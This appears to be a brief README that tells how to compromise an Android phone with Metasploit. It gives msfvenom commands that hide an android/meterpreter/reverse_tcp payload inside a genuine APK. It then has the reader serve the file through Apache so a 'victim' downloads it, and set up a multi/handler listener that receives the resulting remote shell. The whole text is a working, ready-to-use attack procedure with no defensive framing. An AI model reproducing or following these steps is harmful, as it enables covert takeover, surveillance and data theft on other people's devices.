# Hacking-android-device-using-metasploit
We will inject a payload inside a genuine application.
Requirements 
      -metasploit
      -msfvenom
      -apktool
      -jarsigner
      -servicesapache2
Open up your terminal and run this commands
       sudo su
       msfvenom -x application.apk -p android/meterpreter/reverse_tcp LHOST= IP ADDRESS LPORT=5555/4444 -o application.apk
       service apache2 start
       optional (mv application.apk /var/www/html) send apk to victim to download
        msfconsole
       use  exploit/multi/handler
       set payload android/meterpreter/reverse_tcp
       set LHOST I.P address
       set LPORT 5555/4444
run

